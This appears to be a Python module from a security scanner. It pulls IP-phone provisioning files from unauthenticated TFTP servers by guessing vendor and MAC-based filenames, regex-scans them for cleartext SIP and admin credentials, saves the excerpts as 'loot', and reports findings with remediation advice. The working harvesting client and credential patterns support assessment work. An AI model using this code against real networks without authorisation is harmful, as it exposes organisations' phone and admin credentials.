"""TFTP config pull — the classic IP-phone provisioning attack.

Cisco, Polycom, Yealink, Grandstream, Snom, Mitel, and most other SIP phones
boot, look up DHCP option 66 for their TFTP server, then download their
config by one of a handful of predictable filenames derived from their MAC
address:

    Cisco CUCM        SEP<MAC>.cnf.xml      (Skinny)
                      CTLFile.tlv           (trust list)
                      dialplan.xml
                      MIDlets
    Polycom           <MAC>.cfg / 000000000000.cfg
                      sip.cfg, phone1.cfg, reg1.cfg
    Yealink           cfg<MAC>.cfg / y000000000000.cfg
                      <ModelNumber>.cfg
    Grandstream       cfg<MAC> / cfg<MAC>.bin  (encrypted unless 'OpenVPN'
                                                 config uploaded)
    Snom              snom<ModelNumber>.htm / snom<ModelNumber>-SIP.xml
    Mitel             e<MAC>.cfg
    Aastra/Mitel      <MAC>.cfg

Configs frequently contain:
    * SIP credentials in cleartext (username + password for the extension)
    * Admin passwords
    * Provisioning server URLs
    * CA certificates (for attacker pinning / MITM planning)

This module implements a minimal TFTP RRQ client (no 3rd party dep) that
can fetch a list of known filenames from a target TFTP server.  Findings
classify each pulled file by credential-like patterns.

RFC 1350 TFTP summary:
    opcode 1  Read Request   (RRQ)
    opcode 2  Write Request  (WRQ)
    opcode 3  Data           (DATA)  block# + payload (512 bytes)
    opcode 4  Acknowledgment (ACK)   block#
    opcode 5  Error          (ERR)   code + msg

We implement RRQ only.
"""
from __future__ import annotations

import os
import re
import socket
import struct
import time
from dataclasses import dataclass, field


TFTP_PORT = 69
BLOCK_SIZE = 512
MAX_BYTES = 1_048_576  # 1 MB — more than any phone config ever was

OPCODE_RRQ = 1
OPCODE_DATA = 3
OPCODE_ACK = 4
OPCODE_ERROR = 5


# Short list of MAC-agnostic candidates — we try these even without MAC
# information because many deployments use the generic fallback.
GENERIC_CANDIDATES = [
    # Polycom
    "000000000000.cfg",
    "sip.cfg",
    "phone1.cfg",
    "reg1.cfg",
    "device.cfg",
    "features.cfg",
    "site.cfg",
    # Yealink
    "y000000000000.cfg",
    "y000000000028.cfg",   # T28
    "y000000000065.cfg",   # T46G
    # Cisco — config fetched by the CTL before any device-specific file
    "CTLFile.tlv",
    "ITLFile.tlv",
    "RootCA.cer",
    "SEPDefault.cnf",
    "XMLDefault.cnf.xml",
    "dialplan.xml",
    # Grandstream
    "cfg.bin",
    "cfg.xml",
    # Aastra/Mitel
    "aastra.cfg",
    "startup.cfg",
    # Snom
    "snom320.htm",
    "snom-phone-config.xml",
    # Generic
    "config",
    "config.xml",
    "config.cfg",
    "phones.xml",
    "sipdefault.cnf",
]


@dataclass
class TftpFileResult:
    filename: str
    bytes_received: int = 0
    error: str = ""
    credentials_suspected: list[str] = field(default_factory=list)
    content_excerpt: str = ""


@dataclass
class TftpLootResult:
    target: str
    port: int = TFTP_PORT
    files_fetched: list[TftpFileResult] = field(default_factory=list)
    files_missing: list[str] = field(default_factory=list)
    elapsed_s: float = 0.0

    @property
    def any_success(self) -> bool:
        return any(f.bytes_received > 0 for f in self.files_fetched)


def _build_rrq(filename: str, mode: str = "octet") -> bytes:
    """TFTP RRQ packet: opcode(2) + filename + NUL + mode + NUL."""
    return (
        struct.pack("!H", OPCODE_RRQ)
        + filename.encode("ascii", errors="replace")
        + b"\x00"
        + mode.encode("ascii")
        + b"\x00"
    )


def _parse_packet(pkt: bytes) -> tuple[int, int, bytes] | None:
    """Return (opcode, block_or_errcode, payload)."""
    if len(pkt) < 4:
        return None
    opcode = struct.unpack("!H", pkt[0:2])[0]
    block = struct.unpack("!H", pkt[2:4])[0]
    return opcode, block, pkt[4:]


def fetch_file(
    host: str,
    filename: str,
    port: int = TFTP_PORT,
    timeout: float = 3.0,
    max_bytes: int = MAX_BYTES,
) -> TftpFileResult:
    """Perform a single TFTP RRQ + DATA/ACK loop. Returns bytes received +
    any detected credential-like strings in the content."""
    result = TftpFileResult(filename=filename)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    server_addr = (host, port)

    try:
        rrq = _build_rrq(filename)
        sock.sendto(rrq, server_addr)

        data_accum = bytearray()
        expected_block = 1
        tid_addr: tuple | None = None

        while True:
            try:
                pkt, addr = sock.recvfrom(4096)
            except socket.timeout:
                if not data_accum:
                    result.error = "timeout"
                break

            if tid_addr is None:
                tid_addr = addr  # server picks a new port as TID
            elif addr != tid_addr:
                # RFC 1350 mandates ignoring packets from other TIDs.  We
                # send an ERR to the intruder but continue with our TID.
                continue

            parsed = _parse_packet(pkt)
            if not parsed:
                result.error = "malformed packet"
                break
            opcode, block, payload = parsed

            if opcode == OPCODE_ERROR:
                err = payload.rstrip(b"\x00").decode("utf-8", errors="replace")
                result.error = f"server error code={block} msg={err}"
                break

            if opcode != OPCODE_DATA:
                result.error = f"unexpected opcode {opcode}"
                break

            if block != expected_block:
                # Duplicate — re-ACK and wait for the real one
                sock.sendto(struct.pack("!HH", OPCODE_ACK, block), tid_addr)
                continue

            data_accum.extend(payload)
            sock.sendto(struct.pack("!HH", OPCODE_ACK, block), tid_addr)

            if len(data_accum) > max_bytes:
                result.error = f"file exceeded max_bytes ({max_bytes})"
                break

            if len(payload) < BLOCK_SIZE:
                # Last block by TFTP definition
                break
            expected_block = (expected_block + 1) & 0xFFFF

        result.bytes_received = len(data_accum)
        if data_accum:
            text = data_accum.decode("utf-8", errors="replace")
            result.content_excerpt = text[:512]
            result.credentials_suspected = _scan_for_credentials(text)
    except OSError as exc:
        result.error = f"socket: {exc}"
    finally:
        sock.close()
    return result


_CRED_PATTERNS = [
    (re.compile(r"(?i)<password[^>]*>([^<]{1,200})</password>"), "XML password field"),
    (re.compile(r"(?i)secret\s*=\s*[\"']?([^\"'\s<>]{3,200})"), "secret="),
    (re.compile(r"(?i)password\s*=\s*[\"']?([^\"'\s<>]{3,200})"), "password="),
    (re.compile(r"(?i)authPassword\s*=\s*[\"']?([^\"'\s<>]{3,200})"), "authPassword="),
    (re.compile(r"(?i)auth\.password\s*=\s*[\"']?([^\"'\s<>]{3,200})"), "auth.password="),
    (re.compile(r"(?i)<authID[^>]*>([^<]{1,200})</authID>"), "XML authID field"),
    (re.compile(r"(?i)<account\.\d+\.password[^>]*>([^<]{1,200})</"), "Yealink password field"),
    (re.compile(r"(?i)reg\.\d+\.auth\.password[^=\s]*=\s*([^\s]+)"), "Polycom reg password"),
    (re.compile(r"(?i)<user[^>]*>.*?<password[^>]*>([^<]+)</password>"), "user/password pair"),
    (re.compile(r"(?i)\badmin\s*[:=]\s*['\"]?([A-Za-z0-9_!@#$%^&*\-+=]{3,40})"), "admin cred"),
]


def _scan_for_credentials(text: str) -> list[str]:
    hits: list[str] = []
    seen: set[str] = set()
    for pat, label in _CRED_PATTERNS:
        for m in pat.finditer(text):
            val = m.group(1).strip()
            if val and val not in seen and not _is_placeholder(val):
                hits.append(f"{label}: {val[:40]}")
                seen.add(val)
                if len(hits) >= 15:
                    return hits
    return hits


def _is_placeholder(val: str) -> bool:
    """Skip common XML placeholders / examples so the report doesn't drown
    in false positives from provisioning templates."""
    low = val.lower().strip()
    return low in {"", "password", "secret", "admin", "changeme",
                   "$password", "%password%", "<password>",
                   "${password}", "{{password}}", "xxxxxxxx"}


def loot_tftp(
    host: str,
    mac: str | None = None,
    extra_filenames: list[str] | None = None,
    port: int = TFTP_PORT,
    timeout: float = 3.0,
    max_files: int = 40,
) -> TftpLootResult:
    """Try to pull known provisioning filenames from a TFTP server.

    If ``mac`` is provided, try the Cisco/Polycom/Yealink MAC-specific
    filename variants as well.  `max_files` caps how many requests we send.
    """
    start = time.monotonic()
    result = TftpLootResult(target=host, port=port)

    candidates = list(extra_filenames or [])
    candidates.extend(GENERIC_CANDIDATES)
    if mac:
        mac_clean = re.sub(r"[^0-9a-fA-F]", "", mac).upper()
        if len(mac_clean) == 12:
            candidates.extend([
                f"SEP{mac_clean}.cnf.xml",
                f"{mac_clean}.cfg",
                f"cfg{mac_clean}.cfg",
                f"cfg{mac_clean.lower()}.cfg",
                f"{mac_clean.lower()}.cfg",
                f"e{mac_clean.lower()}.cfg",
            ])

    # Deduplicate while preserving order so that probes stay predictable
    seen: set[str] = set()
    ordered: list[str] = []
    for c in candidates:
        if c not in seen:
            seen.add(c)
            ordered.append(c)
    ordered = ordered[:max_files]

    for filename in ordered:
        r = fetch_file(host, filename, port=port, timeout=timeout)
        if r.bytes_received > 0:
            result.files_fetched.append(r)
        else:
            result.files_missing.append(filename)

    result.elapsed_s = time.monotonic() - start
    return result


def save_loot(result: TftpLootResult, out_dir: str) -> list[str]:
    """Dump recovered files to ``out_dir/tftp_loot/``.  Returns paths written."""
    target_dir = os.path.join(out_dir, "tftp_loot")
    os.makedirs(target_dir, exist_ok=True)
    written: list[str] = []
    for f in result.files_fetched:
        # Sanitise — TFTP filenames may contain path-ish characters, but we
        # refuse anything with separators to prevent path traversal when the
        # caller's `out_dir` is a shared directory.
        safe = re.sub(r"[^A-Za-z0-9._-]", "_", f.filename)
        path = os.path.join(target_dir, safe)
        try:
            with open(path, "w", encoding="utf-8", errors="replace") as fh:
                fh.write(f.content_excerpt)
                # write the excerpt only — we kept it capped for safety; if
                # the caller wants full files they can extend TftpFileResult
            written.append(path)
        except OSError:
            continue
    return written


def build_findings(result: TftpLootResult) -> list[dict]:
    """Convert a TftpLootResult into scanner findings."""
    out: list[dict] = []
    if not result.any_success:
        return out
    out.append({
        "id": "tftp.open",
        "severity": "high",
        "host": result.target,
        "title": f"Unauthenticated TFTP provisioning server on UDP/{result.port}",
        "detail": (
            f"{len(result.files_fetched)} provisioning file(s) pulled from "
            f"{result.target}:{result.port} without authentication. TFTP "
            f"carries no auth by design — any attacker on the management "
            f"network can harvest phone configurations. Files: "
            + ", ".join(f.filename for f in result.files_fetched[:5])
            + (" ..." if len(result.files_fetched) > 5 else "")
        ),
        "remediation": (
            "Restrict UDP/69 to the phone VLAN via ACL. Prefer HTTPS "
            "provisioning (Polycom PPCIP/URL, Yealink https://) with "
            "mutual-TLS and signed configs. Disable TFTP on the provisioning "
            "host once all phones have migrated."
        ),
    })
    # Credential-exposure findings — aggregate per file so the report is
    # skimmable and sorted loudest-first.
    for f in result.files_fetched:
        if not f.credentials_suspected:
            continue
        out.append({
            "id": f"tftp.creds_in_config:{f.filename}",
            "severity": "critical",
            "host": result.target,
            "title": f"SIP credentials exposed in {f.filename}",
            "detail": (
                f"TFTP config {f.filename} contains cleartext credential-like "
                f"strings: " + "; ".join(f.credentials_suspected[:5])
                + (" ..." if len(f.credentials_suspected) > 5 else "")
            ),
            "remediation": (
                "Move to encrypted provisioning (Cisco CUCM encrypted "
                "phone config, Polycom ConfigFileAlias, Yealink AES "
                "configuration encryption). Rotate any credentials that "
                "were exposed."
            ),
        })
    return out
